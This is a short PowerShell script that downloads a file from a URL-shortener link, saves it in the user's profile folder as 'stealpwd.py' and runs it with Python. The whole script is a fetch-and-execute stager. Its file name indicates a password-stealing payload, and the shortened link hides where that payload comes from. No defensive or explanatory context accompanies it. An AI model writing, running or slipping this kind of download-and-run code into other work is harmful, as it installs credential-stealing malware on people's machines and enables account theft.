$url = "https://rebrand.ly/iab05iw"
$output = "$env:USERPROFILE\stealpwd.py"

try {
    Invoke-WebRequest -Uri $url -OutFile $output
    Write-Output "Download succeeded."
    python3 $output
} catch {
    Write-Output "Download failed: $_"
}
